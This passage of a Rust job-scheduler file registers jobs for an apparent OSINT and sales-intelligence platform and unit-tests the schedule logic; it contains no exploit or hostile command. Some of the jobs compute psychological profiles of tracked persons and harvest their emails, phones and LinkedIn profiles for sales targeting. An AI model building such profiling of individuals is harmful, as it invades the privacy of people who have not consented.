    // POI network expansion discovery: find new POIs from existing seeds (03:30 UTC)
    s.register(
        JobDef::new(
            JobKind::PoiDiscovery,
            Schedule::DailyAt {
                hour: 3,
                minute: 30,
            },
        )
        .with_jitter(180) // +3 min
        .with_timeout(7200), // 2 h — network scraping can be slow
    );

    s.register(
        JobDef::new(
            JobKind::FeatureDriftCheck,
            Schedule::DailyAt { hour: 4, minute: 0 },
        )
        .with_jitter(240) // +4 min
        .with_timeout(3600),
    );

    // Weekly on Monday at 06:00–08:00 UTC; staggered 2 min each (B231)
    s.register(
        JobDef::new(
            JobKind::PromotionBoard,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 6,
                minute: 0,
            },
        )
        .with_jitter(0)
        .with_timeout(3600),
    );

    s.register(
        JobDef::new(
            JobKind::StrategyMemo,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 7,
                minute: 0,
            },
        )
        .with_jitter(120)
        .with_timeout(3600),
    );

    s.register(
        JobDef::new(
            JobKind::RecipeDeprecation,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 8,
                minute: 0,
            },
        )
        .with_jitter(240)
        .with_timeout(*JOB_TIMEOUT_SECS),
    );

    // ── Self-improvement loop (weekly, Mon 09:00–11:00 UTC) ──

    // Source scoring: re-rank crawl sources by yield, freshness, novelty.
    s.register(
        JobDef::new(
            JobKind::SourceScoring,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 9,
                minute: 0,
            },
        )
        .with_jitter(0)
        .with_timeout(*JOB_TIMEOUT_SECS),
    );

    // Cross-domain combination mining: discover synergistic multi-signal patterns.
    s.register(
        JobDef::new(
            JobKind::CrossDomainMining,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 10,
                minute: 0,
            },
        )
        .with_jitter(120)
        .with_timeout(3600), // 1 h — combinatorial search
    );

    // Outcome tracking: match predictions against observed outcomes, update accuracy.
    s.register(
        JobDef::new(
            JobKind::OutcomeTracking,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 11,
                minute: 0,
            },
        )
        .with_jitter(60)
        .with_timeout(*JOB_TIMEOUT_SECS),
    );

    // ── Security compliance jobs ──────────────────────────────────────────────

    // Breach scan: daily at 01:00 UTC — check all monitored domains/emails against HIBP + IntelX.
    s.register(
        JobDef::new(
            JobKind::BreachScan,
            Schedule::DailyAt { hour: 1, minute: 0 },
        )
        .with_jitter(0)
        .with_timeout(3600), // 1h — HIBP/IntelX rate-limited
    );

    // Sanctions screen: daily at 01:30 UTC — fuzzy-match all tracked entities against sanctions lists.
    s.register(
        JobDef::new(
            JobKind::SanctionsScreen,
            Schedule::DailyAt {
                hour: 1,
                minute: 30,
            },
        )
        .with_jitter(120)
        .with_timeout(*JOB_TIMEOUT_SECS),
    );

    // Recipe fire: nightly at 02:15 UTC — run seed recipes against observation counts to generate insights.
    s.register(
        JobDef::new(
            JobKind::RecipeFire,
            Schedule::DailyAt {
                hour: 2,
                minute: 15,
            },
        )
        .with_jitter(60) // +1 min
        .with_timeout(*JOB_TIMEOUT_SECS),
    );

    // SLA enforcement: every 10 minutes — re-escalate unacknowledged warnings past SLA.
    s.register(
        JobDef::new(
            JobKind::SlaEnforcement,
            Schedule::IntervalSecs(600), // every 10 minutes
        )
        .with_jitter(0)
        .with_timeout(120), // 2 min max
    );

    // ── Security scanning jobs ────────────────────────────────────────────────

    // DNS posture scan: daily at 03:30 UTC — check SPF/DKIM/DMARC for all tracked domains.
    s.register(
        JobDef::new(
            JobKind::DnsPostureScan,
            Schedule::DailyAt {
                hour: 3,
                minute: 30,
            },
        )
        .with_jitter(120)
        .with_timeout(*JOB_TIMEOUT_SECS),
    );

    // KEV catalog fetch: daily at 04:30 UTC — download CISA KEV catalog.
    s.register(
        JobDef::new(
            JobKind::KevCatalogFetch,
            Schedule::DailyAt {
                hour: 4,
                minute: 30,
            },
        )
        .with_jitter(60)
        .with_timeout(900), // 15 min
    );

    // Lookalike domain scan: daily at 05:00 UTC — detect typosquat/lookalike domains.
    s.register(
        JobDef::new(
            JobKind::LookalikeDomainScan,
            Schedule::DailyAt { hour: 5, minute: 0 },
        )
        .with_jitter(120)
        .with_timeout(3600), // 1 h
    );

    // Update email digest: every 15 minutes — actual send time is per-user settings (CET).
    s.register(
        JobDef::new(JobKind::UpdateEmailDigest, Schedule::IntervalSecs(900))
            .with_jitter(0)
            .with_timeout(300),
    );

    // Self-improvement cycle: weekly Mon at 12:00 UTC — coordinated self-improvement run.
    s.register(
        JobDef::new(
            JobKind::SelfImprovementCycle,
            Schedule::WeeklyOn {
                day: IsoWeekday::Mon,
                hour: 12,
                minute: 0,
            },
        )
        .with_jitter(0)
        .with_timeout(10800), // 3 h
    );

    // Embedding reindex: nightly at 03:00 UTC — incremental embedding generation.
    s.register(
        JobDef::new(
            JobKind::EmbeddingReindex,
            Schedule::DailyAt { hour: 3, minute: 0 },
        )
        .with_jitter(180) // +3 min
        .with_timeout(7200), // 2 h — LLM embedding inference can be slow
    );

    // Autocomplete index rebuild: daily at 04:15 UTC — after nightly data pipeline completes.
    s.register(
        JobDef::new(
            JobKind::Custom("rebuild-autocomplete".to_string()),
            Schedule::DailyAt {
                hour: 4,
                minute: 15,
            },
        )
        .with_jitter(60) // +1 min
        .with_timeout(600), // 10 min
    );

    // StarzCRM sync: hourly — read-only MySQL pull of deals/accounts.
    s.register(
        JobDef::new(JobKind::StarzCrmSync, Schedule::IntervalSecs(3600))
            .with_jitter(60) // +1 min spread
            .with_timeout(300), // 5 min max — localhost MySQL, should be fast
    );

    // Dark web forum scan: every 6 hours — monitors breach forums, paste sites, ransomware blogs.
    s.register(
        JobDef::new(JobKind::DarkWebScan, Schedule::IntervalSecs(21600))
            .with_jitter(120) // +2 min spread
            .with_timeout(3600), // 1 h — network-bound, may be slow
    );

    // ── AI Triage Engine ────────────────────────────────────────────────

    // Triage processing: every 5 minutes — scores unscored triage items via LLM.
    s.register(
        JobDef::new(JobKind::TriageProcessing, Schedule::IntervalSecs(300))
            .with_jitter(0)
            .with_timeout(120), // 2 min — lightweight LLM scoring call
    );

    // ── Historical Trend Aggregation ────────────────────────────────────

    // Trend aggregation: daily at 01:00 UTC — computes materialized rollup
    // metrics for daily, weekly, monthly, quarterly, and yearly buckets.
    s.register(
        JobDef::new(
            JobKind::TrendAggregation,
            Schedule::DailyAt {
                hour: 1,
                minute: 0,
            },
        )
        .with_jitter(0)
        .with_timeout(3600), // 1 h — database aggregation queries
    );

    // ── Competitive Intelligence Insight Generation ─────────────────────

    // Insight generation: every 6 hours — produces competitive intelligence
    // insights from recent observations, grouped by company.
    s.register(
        JobDef::new(JobKind::InsightGeneration, Schedule::IntervalSecs(21600))
            .with_jitter(300) // +5 min spread
            .with_timeout(7200), // 2 h — LLM inference can be slow
    );

    // ── Threat Intelligence Refresh ─────────────────────────────────────

    // Threat intel refresh: every 6 hours — updates supply chain risk scores,
    // threat actor profiles, competitive intelligence, and attack surface assessments.
    s.register(
        JobDef::new(JobKind::ThreatIntelRefresh, Schedule::IntervalSecs(21600))
            .with_jitter(600) // +10 min spread
            .with_timeout(7200), // 2 h — multiple assessment modules
    );

    // ── Psychological Profile Computation ───────────────────────────────

    // Psych profile compute: daily at 05:30 UTC — recalculates psych profiles
    // for all POIs from current artifacts and metadata.
    s.register(
        JobDef::new(
            JobKind::PsychProfileCompute,
            Schedule::DailyAt {
                hour: 5,
                minute: 30,
            },
        )
        .with_jitter(180) // +3 min spread
        .with_timeout(3600), // 1 h — per-person artifact analysis
    );

    // POI role reclassify: daily at 05:45 UTC — re-derives role_family for every
    // person from their current_role via the canonical classifier. Corrects the
    // stale seeded 'C-Suite' default so procurement/supply-chain/quality
    // contacts are accurately categorized for buying-center recommendations.
    s.register(
        JobDef::new(
            JobKind::PoiRoleReclassify,
            Schedule::DailyAt {
                hour: 5,
                minute: 45,
            },
        )
        .with_jitter(120)
        .with_timeout(900), // 15 min — pure CPU classification, no I/O
    );

    // OSINT enrichment: every 6 hours — invokes structured-source fetchers
    // (SEC EDGAR, NVD/CVE, RDAP, OpenAlex, DNS posture) for tracked companies.
    // These produce typed observations with full provenance, complementing the
    // generic RSS/web crawl.
    s.register(
        JobDef::new(JobKind::OsintEnrichment, Schedule::IntervalSecs(21600))
            .with_jitter(600) // +10 min spread
            .with_timeout(3600), // 1 h — multiple HTTP sources
    );

    // ── Adversarial Analysis ────────────────────────────────────────────

    // Adversarial analysis: every 6 hours — placement clustering, source entropy
    // detection, and quarantine management.
    s.register(
        JobDef::new(JobKind::AdversarialAnalysis, Schedule::IntervalSecs(21600))
            .with_jitter(900) // +15 min spread — avoid overlap with other 6h jobs
            .with_timeout(3600), // 1 h — clustering + entropy + quarantine
    );

    // ── Dynamic Anomaly Scan ───────────────────────────────────────────

    // Anomaly scan: every 4 hours — runs statistical analysis on observation
    // volume trends, signal diversity shifts, and source reliability to
    // generate dynamic, data-driven warnings that aren't recipe-gated.
    s.register(
        JobDef::new(JobKind::AnomalyScan, Schedule::IntervalSecs(14400))
            .with_jitter(600) // +10 min spread
            .with_timeout(1800), // 30 min — SQL queries + analysis
    );

    // ── Social Media Scan ──────────────────────────────────────────────

    // Social scan: every 2 hours — ingests from Reddit, Telegram, Twitter
    // (Nitter), and Hacker News. These are the highest-velocity OSINT sources
    // and should produce real-time SocialPost observations for the insight
    // engine. Previously the system had ZERO real social media ingestion.
    s.register(
        JobDef::new(JobKind::SocialScan, Schedule::IntervalSecs(7200))
            .with_jitter(300) // +5 min spread
            .with_timeout(1800), // 30 min — multiple HTTP sources with rate limiting
    );

    // ── Tender / Procurement Crawler ──────────────────────────────────

    // Tender scan: every 6 hours — scrapes MENA public procurement portals
    // (Tunisia TUNEPS, Morocco ARP, Egypt EPS, UAE, KSA Etimad), filters for
    // EMS/BESS relevance, and emits TenderPosted observations. Lower velocity
    // than social media but directly actionable for targeting. Idempotent via
    // content-hashed observation IDs.
    s.register(
        JobDef::new(JobKind::TenderScan, Schedule::IntervalSecs(21600))
            .with_jitter(900) // +15 min spread — avoid overlap with other 6h jobs
            .with_timeout(1800), // 30 min — multiple portal fetches with rate limiting
    );

    // ─── Sales activation jobs ──────────────────────────────────────────────
    // Contact enrichment: discover verified email/phone/LinkedIn for tracked
    // persons. Runs hourly; the waterfall self-throttles and skips persons that
    // already have contacts.
    s.register(
        JobDef::new(JobKind::ContactEnrichment, Schedule::IntervalSecs(3600))
            .with_jitter(300)
            .with_timeout(1800),
    );
    // ICP scoring: batch-score every non-competitor company against the ICP.
    // Runs every 6h so newly crawled companies are prioritized for sales.
    s.register(
        JobDef::new(JobKind::IcpScoring, Schedule::IntervalSecs(21600))
            .with_jitter(600)
            .with_timeout(1800),
    );
    // Engagement refresh: recompute outreach response rates from engagement_events.
    // Runs every 15 min so the feedback loop stays current after each contact.
    s.register(
        JobDef::new(JobKind::EngagementRefresh, Schedule::IntervalSecs(900))
            .with_jitter(120)
            .with_timeout(300),
    );
    // Buying-center derivation: rebuild the committee per account from roles.
    // Runs every 6h so newly discovered/classified persons appear in committees.
    s.register(
        JobDef::new(JobKind::BuyingCenterDerivation, Schedule::IntervalSecs(21600))
            .with_jitter(600)
            .with_timeout(1800),
    );
    // PersonMention materialization: turn observed-people (OpenAlex/news) into
    // real persons rows. Runs hourly so the person corpus grows continuously.
    s.register(
        JobDef::new(JobKind::PersonMentionMaterialization, Schedule::IntervalSecs(3600))
            .with_jitter(300)
            .with_timeout(1800),
    );

    s
}

// ────────────────────────────────────────────
// Tests
// ────────────────────────────────────────────

#[cfg(test)]
mod tests {
    #![allow(
        clippy::disallowed_methods,
        clippy::field_reassign_with_default,
        clippy::absurd_extreme_comparisons
    )]

    use super::*;
    use chrono::TimeZone;

    fn utc(y: i32, m: u32, d: u32, h: u32, mi: u32, s: u32) -> DateTime<Utc> {
        Utc.with_ymd_and_hms(y, m, d, h, mi, s).unwrap()
    }

    // ── Schedule evaluation ──

    #[test]
    fn test_interval_never_ran() {
        let sched = Schedule::IntervalSecs(3600);
        assert!(is_due(&sched, None, Utc::now()));
    }

    #[test]
    fn test_interval_not_yet_due() {
        let sched = Schedule::IntervalSecs(3600);
        let now = utc(2026, 2, 23, 10, 0, 0);
        let last = utc(2026, 2, 23, 9, 30, 0); // only 30 min ago
        assert!(!is_due(&sched, Some(last), now));
    }

    #[test]
    fn test_interval_due() {
        let sched = Schedule::IntervalSecs(3600);
        let now = utc(2026, 2, 23, 11, 0, 0);
        let last = utc(2026, 2, 23, 9, 30, 0); // 90 min ago
        assert!(is_due(&sched, Some(last), now));
    }

    #[test]
    fn test_daily_never_ran_before_time() {
        let sched = Schedule::DailyAt {
            hour: 14,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 10, 0, 0); // before 14:00
        assert!(!is_due(&sched, None, now));
    }

    #[test]
    fn test_daily_never_ran_after_time() {
        let sched = Schedule::DailyAt {
            hour: 14,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 15, 0, 0); // after 14:00
        assert!(is_due(&sched, None, now));
    }

    #[test]
    fn test_daily_ran_today_already() {
        let sched = Schedule::DailyAt { hour: 2, minute: 0 };
        let now = utc(2026, 2, 23, 15, 0, 0);
        let last = utc(2026, 2, 23, 2, 5, 0); // ran today at 02:05
        assert!(!is_due(&sched, Some(last), now));
    }

    #[test]
    fn test_daily_new_day() {
        let sched = Schedule::DailyAt { hour: 2, minute: 0 };
        let now = utc(2026, 2, 24, 2, 30, 0); // next day, past 02:00
        let last = utc(2026, 2, 23, 2, 5, 0);
        assert!(is_due(&sched, Some(last), now));
    }

    #[test]
    fn test_weekly_catchup_after_missed_day() {
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        // 2026-02-23 is Monday; picking Tuesday — should catch up the missed Monday job
        let now = utc(2026, 2, 24, 7, 0, 0); // Tuesday
        assert!(is_due(&sched, None, now)); // catch-up: Monday target was missed

        // But if already ran on Monday, not due again on Tuesday
        let last_ran_monday = utc(2026, 2, 23, 6, 5, 0);
        assert!(!is_due(&sched, Some(last_ran_monday), now));
    }

    #[test]
    fn test_weekly_right_day_before_time() {
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 5, 0, 0); // Monday 05:00
        assert!(!is_due(&sched, None, now));
    }

    #[test]
    fn test_weekly_right_day_after_time_never_ran() {
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 7, 0, 0); // Monday 07:00
        assert!(is_due(&sched, None, now));
    }

    #[test]
    fn test_weekly_already_ran_this_week() {
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 10, 0, 0); // Monday 10:00
        let last = utc(2026, 2, 23, 6, 5, 0); // ran today at 06:05
        assert!(!is_due(&sched, Some(last), now));
    }

    #[test]
    fn test_weekly_new_week() {
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 3, 2, 7, 0, 0); // next Monday
        let last = utc(2026, 2, 23, 6, 5, 0); // last Monday
        assert!(is_due(&sched, Some(last), now));
    }

    // ── next_fire_time ──

    #[test]
    fn test_next_fire_interval() {
        let sched = Schedule::IntervalSecs(7200);
        let now = utc(2026, 2, 23, 10, 0, 0);
        let next = next_fire_time(&sched, now);
        assert_eq!(next, utc(2026, 2, 23, 12, 0, 0));
    }

    #[test]
    fn test_next_fire_daily_before_target() {
        let sched = Schedule::DailyAt {
            hour: 14,
            minute: 30,
        };
        let now = utc(2026, 2, 23, 10, 0, 0);
        let next = next_fire_time(&sched, now);
        assert_eq!(next, utc(2026, 2, 23, 14, 30, 0));
    }

    #[test]
    fn test_next_fire_daily_after_target() {
        let sched = Schedule::DailyAt { hour: 2, minute: 0 };
        let now = utc(2026, 2, 23, 10, 0, 0);
        let next = next_fire_time(&sched, now);
        assert_eq!(next, utc(2026, 2, 24, 2, 0, 0)); // tomorrow
    }

    #[test]
    fn test_next_fire_weekly_same_day_before() {
        // Monday at 14:00, currently Monday 10:00
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 14,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 10, 0, 0); // Monday
        let next = next_fire_time(&sched, now);
        assert_eq!(next, utc(2026, 2, 23, 14, 0, 0)); // today
    }

    #[test]
    fn test_next_fire_weekly_same_day_after() {
        // Monday at 06:00, currently Monday 10:00
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Mon,
            hour: 6,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 10, 0, 0); // Monday 10:00
        let next = next_fire_time(&sched, now);
        assert_eq!(next, utc(2026, 3, 2, 6, 0, 0)); // next Monday
    }

    #[test]
    fn test_next_fire_weekly_different_day() {
        // Friday at 08:00, currently Monday
        let sched = Schedule::WeeklyOn {
            day: IsoWeekday::Fri,
            hour: 8,
            minute: 0,
        };
        let now = utc(2026, 2, 23, 10, 0, 0); // Monday
        let next = next_fire_time(&sched, now);
        assert_eq!(next, utc(2026, 2, 27, 8, 0, 0)); // Friday
    }

    // ── IsoWeekday conversions ──

    #[test]
    fn test_iso_weekday_roundtrip() {
        for w in &[
            Weekday::Mon,
            Weekday::Tue,
            Weekday::Wed,
            Weekday::Thu,
            Weekday::Fri,
            Weekday::Sat,
            Weekday::Sun,
        ] {
            let iso = IsoWeekday::from_chrono(*w);
            assert_eq!(iso.to_chrono(), *w);
        }
    }

    // ── JobRun ──

    #[test]
    fn test_job_run_lifecycle() {
        let mut run = JobRun::new(JobKind::CrawlCycle);
        assert!(matches!(run.status, JobStatus::Pending));
        run.start();
        assert!(matches!(run.status, JobStatus::Running));
        run.succeed(42, "crawled 42 sources");
        assert!(matches!(run.status, JobStatus::Succeeded { .. }));
        assert_eq!(run.items_processed, 42);
        assert!(run.finished_at.is_some());
    }

    #[test]
    fn test_job_run_fail() {
        let mut run = JobRun::new(JobKind::PatternMining);
        run.start();
        run.fail("database timeout");
        match &run.status {
            JobStatus::Failed { error, .. } => assert_eq!(error, "database timeout"),
            _ => panic!("expected Failed"),
        }
    }

    #[test]
    fn test_job_run_skip() {
        let mut run = JobRun::new(JobKind::PoiRefresh);
        run.skip("no new data");
        match &run.status {
            JobStatus::Skipped { reason } => assert_eq!(reason, "no new data"),
            _ => panic!("expected Skipped"),
        }
    }

    #[test]
    fn test_job_status_is_terminal() {
        assert!(!JobStatus::Pending.is_terminal());
        assert!(!JobStatus::Running.is_terminal());
        assert!(JobStatus::Succeeded { duration_ms: 100 }.is_terminal());
        assert!(JobStatus::Failed {
            error: "e".to_string(),
            duration_ms: 50
        }
        .is_terminal());
        assert!(JobStatus::Skipped {
            reason: "r".to_string()
        }
        .is_terminal());
    }

    // ── JobDef circuit breaker ──

    #[test]
    fn test_circuit_breaker_triggers() {
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def.max_consecutive_failures = 3;

        for i in 0..3 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.start();
            run.fail(&format!("error {}", i));
            def.record_run(&run);
        }

        assert!(def.is_circuit_broken());
        assert!(!def.enabled);
    }

    #[test]
    fn test_circuit_breaker_resets_on_success() {
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def.max_consecutive_failures = 5;

        // 3 failures
        for _ in 0..3 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.start();
            run.fail("err");
            def.record_run(&run);
        }
        assert_eq!(def.consecutive_failures, 3);

        // 1 success resets
        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.start();
        run.succeed(10, "ok");
        def.record_run(&run);
        assert_eq!(def.consecutive_failures, 0);
    }

    #[test]
    fn test_circuit_breaker_manual_reset() {
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def.max_consecutive_failures = 2;
        for _ in 0..2 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.start();
            run.fail("err");
            def.record_run(&run);
        }
        assert!(def.is_circuit_broken());
        def.reset_circuit_breaker();
        assert!(!def.is_circuit_broken());
        assert!(def.enabled);
    }

    // ── Scheduler ──

    #[test]
    fn test_register_and_unregister() {
        let mut sched = Scheduler::new();
        let def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        assert!(sched.register(def.clone()));
        assert!(!sched.register(def)); // duplicate
        assert_eq!(sched.jobs.len(), 1);
        assert!(sched.unregister(&JobKind::CrawlCycle));
        assert!(sched.jobs.is_empty());
    }

    #[test]
    fn test_due_jobs_interval() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(3600));
        def.last_run = Some(utc(2026, 2, 23, 8, 0, 0));
        sched.register(def);

        // 30 min later — not due
        let due = sched.due_jobs(utc(2026, 2, 23, 8, 30, 0));
        assert!(due.is_empty());

        // 2 hours later — due
        let due = sched.due_jobs(utc(2026, 2, 23, 10, 0, 0));
        assert_eq!(due.len(), 1);
        assert_eq!(due[0], JobKind::CrawlCycle);
    }

    #[test]
    fn test_due_jobs_respects_disabled() {
        let mut sched = Scheduler::new();
        let mut def = JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60));
        def.enabled = false;
        sched.register(def);

        let due = sched.due_jobs(Utc::now());
        assert!(due.is_empty());
    }

    #[test]
    fn test_record_run_and_history() {
        let mut sched = Scheduler::new();
        sched.register(JobDef::new(
            JobKind::CrawlCycle,
            Schedule::IntervalSecs(3600),
        ));

        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.start();
        run.succeed(50, "ok");
        sched.record_run(run);

        assert_eq!(sched.history.len(), 1);
        let def = sched.jobs.get("crawl_cycle").unwrap();
        assert!(def.last_run.is_some());
        assert!(matches!(def.last_status, Some(JobStatus::Succeeded { .. })));
    }

    #[test]
    fn test_history_trimming() {
        let mut sched = Scheduler::new();
        sched.max_history = 5;
        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));

        for _ in 0..10 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.start();
            run.succeed(1, "ok");
            sched.record_run(run);
        }
        assert_eq!(sched.history.len(), 5);
    }

    #[test]
    fn test_success_rate() {
        let mut sched = Scheduler::new();
        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));

        // 3 successes, 2 failures
        for i in 0..5 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.start();
            if i < 3 {
                run.succeed(1, "ok");
            } else {
                run.fail("err");
            }
            sched.record_run(run);
        }

        let rate = sched.success_rate(&JobKind::CrawlCycle, 10);
        assert!((rate - 0.6).abs() < 0.01);
    }

    #[test]
    fn test_success_rate_empty() {
        let sched = Scheduler::new();
        assert_eq!(sched.success_rate(&JobKind::CrawlCycle, 10), 0.0);
    }

    #[test]
    fn test_status_summary() {
        let mut sched = default_scheduler();

        // Record one crawl run
        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.start();
        run.succeed(100, "all good");
        sched.record_run(run);

        let summary = sched.status_summary();
        assert!(summary.len() >= 11); // 11 default jobs
        let crawl_summary = summary
            .iter()
            .find(|s| s.kind == JobKind::CrawlCycle)
            .unwrap();
        assert!(crawl_summary.enabled);
        assert!(crawl_summary.last_run.is_some());
    }

    #[test]
    fn test_default_scheduler_job_count() {
        let s = default_scheduler();
        let expected_jobs = [
            "crawl_cycle",
            "pattern_mining",
            "hypothesis_generation",
            "poi_refresh",
            "poi_discovery",
            "poi_role_reclassify",
            "osint_enrichment",
            "promotion_board",
            "strategy_memo",
            "recipe_deprecation",
            "feature_drift_check",
            "source_scoring",
            "cross_domain_mining",
            "outcome_tracking",
            "breach_scan",
            "sanctions_screen",
            "recipe_fire",
            "sla_enforcement",
            "dns_posture_scan",
            "kev_catalog_fetch",
            "lookalike_domain_scan",
            "update_email_digest",
            "self_improvement_cycle",
            "embedding_reindex",
            "rebuild-autocomplete",
            "starzcrm_sync",
            "dark_web_scan",
            "triage_processing",
            "trend_aggregation",
            "insight_generation",
            "threat_intel_refresh",
            "psych_profile_compute",
            "adversarial_analysis",
            "anomaly_scan",
            "social_scan",
            "tender_scan",
            "contact_enrichment",
            "icp_scoring",
            "engagement_refresh",
            "buying_center_derivation",
            "person_mention_materialization",
        ];

        assert_eq!(s.jobs.len(), expected_jobs.len());
        for expected_job in expected_jobs {
            assert!(
                s.jobs.contains_key(expected_job),
                "missing default job {expected_job}"
            );
        }
    }

    #[test]
    fn test_runs_for_filters_by_kind() {
        let mut sched = Scheduler::new();
        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));
        sched.register(JobDef::new(
            JobKind::PoiRefresh,
            Schedule::DailyAt { hour: 3, minute: 0 },
        ));

        let mut r1 = JobRun::new(JobKind::CrawlCycle);
        r1.start();
        r1.succeed(10, "");
        sched.record_run(r1);

        let mut r2 = JobRun::new(JobKind::PoiRefresh);
        r2.start();
        r2.succeed(5, "");
        sched.record_run(r2);

        let mut r3 = JobRun::new(JobKind::CrawlCycle);
        r3.start();
        r3.succeed(20, "");
        sched.record_run(r3);

        assert_eq!(sched.runs_for(&JobKind::CrawlCycle).len(), 2);
        assert_eq!(sched.runs_for(&JobKind::PoiRefresh).len(), 1);
    }

    #[test]
    fn test_job_kind_custom() {
        let kind = JobKind::Custom("my_custom_job".to_string());
        assert_eq!(kind.as_str(), "my_custom_job");
    }

    #[test]
    fn test_job_kind_serialization() {
        let kind = JobKind::CrawlCycle;
        let json = serde_json::to_string(&kind).unwrap();
        let back: JobKind = serde_json::from_str(&json).unwrap();
        assert_eq!(back, kind);
    }

    #[test]
    fn test_schedule_serialization() {
        let s = Schedule::WeeklyOn {
            day: IsoWeekday::Fri,
            hour: 8,
            minute: 30,
        };
        let json = serde_json::to_string(&s).unwrap();
        let back: Schedule = serde_json::from_str(&json).unwrap();
        assert_eq!(back, s);
    }

    #[test]
    fn test_avg_duration_ms() {
        let mut sched = Scheduler::new();
        sched.register(JobDef::new(JobKind::CrawlCycle, Schedule::IntervalSecs(60)));

        // Record runs with known durations manually
        for i in 0u32..3 {
            let mut run = JobRun::new(JobKind::CrawlCycle);
            run.started_at = utc(2026, 2, 23, 10, 0, 0);
            run.status = JobStatus::Succeeded {
                duration_ms: (i as u64 + 1) * 100,
            };
            run.finished_at = Some(utc(2026, 2, 23, 10, 0, i + 1));
            sched.record_run(run);
        }

        let avg = sched.avg_duration_ms(&JobKind::CrawlCycle, 10);
        assert!((avg - 200.0).abs() < 0.01); // (100+200+300)/3
    }

    #[test]
    fn test_avg_duration_empty() {
        let sched = Scheduler::new();
        assert_eq!(sched.avg_duration_ms(&JobKind::CrawlCycle, 10), 0.0);
    }

    // ── B231: jitter ──────────────

    #[test]
    fn test_jitter_delays_interval_job() {
        // job with jitter_offset_secs=120 should NOT fire until 3720s after last run
        let sched_ref = Schedule::IntervalSecs(3600);
        let last = utc(2026, 2, 23, 8, 0, 0);
        let at_3600 = utc(2026, 2, 23, 9, 0, 0); // exactly 3600s later
        let at_3720 = utc(2026, 2, 23, 9, 2, 0); // 3720s later
        assert!(!is_due_with_jitter(&sched_ref, Some(last), at_3600, 120));
        assert!(is_due_with_jitter(&sched_ref, Some(last), at_3720, 120));
    }

    #[test]
    fn test_jitter_zero_equals_is_due() {
        let sched = Schedule::IntervalSecs(3600);
        let last = utc(2026, 2, 23, 8, 0, 0);
        let now = utc(2026, 2, 23, 9, 30, 0);
        assert_eq!(
            is_due(&sched, Some(last), now),
            is_due_with_jitter(&sched, Some(last), now, 0)
        );
    }

    #[test]
    fn test_jitter_stagger_default_scheduler_jobs() {
        // Verify default scheduler has different jitter offsets on its daily jobs
        // so they don't all fire at exactly the same time
        let s = default_scheduler();
        let mining_jitter = s.jobs.get("pattern_mining").map(|d| d.jitter_offset_secs);
        let poi_jitter = s.jobs.get("poi_refresh").map(|d| d.jitter_offset_secs);
        let drift_jitter = s
            .jobs
            .get("feature_drift_check")
            .map(|d| d.jitter_offset_secs);
        assert_ne!(mining_jitter, poi_jitter);
        assert_ne!(poi_jitter, drift_jitter);
    }

    // ── B232: duration_ms clock skew guard ──────────────

    #[test]
    fn test_duration_ms_clock_skew_returns_zero() {
        // Simulate a Pending run where started_at is in the future
        // (clock jumped backward after the run was started).
        // duration_ms must never panic or wrap around.
        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.started_at = utc(2099, 1, 1, 0, 0, 0); // far future
        let d = run.duration_ms();
        assert_eq!(d, 0, "clock-skew duration must be clamped to 0, got {}", d);
    }

    #[test]
    fn test_duration_ms_terminal_uses_stored_value() {
        let mut run = JobRun::new(JobKind::CrawlCycle);
        run.start();
        // Manually set a large stored duration
        run.status = JobStatus::Succeeded {
            duration_ms: 99_999,
        };
        assert_eq!(run.duration_ms(), 99_999);
    }

    #[test]
    fn test_skip_reason_code_normalization() {
        assert_eq!(skip_reason_code("no new data"), "NO_NEW_DATA");
        assert_eq!(
            skip_reason_code("budget-limit: exceeded"),
            "BUDGET_LIMIT_EXCEEDED"
        );
        assert_eq!(skip_reason_code("   "), "UNSPECIFIED");
    }

    // ── B233: minimum interval guard ──────────────

    #[test]
    fn test_schedule_validate_interval_too_short() {
        let s = Schedule::IntervalSecs(30);
        let result = s.validate();
        assert!(result.is_err(), "30s interval should fail validation");
        assert!(result.unwrap_err().contains("below minimum"));
    }

    #[test]
    fn test_schedule_validate_interval_zero() {
        let s = Schedule::IntervalSecs(0);
        assert!(s.validate().is_err());
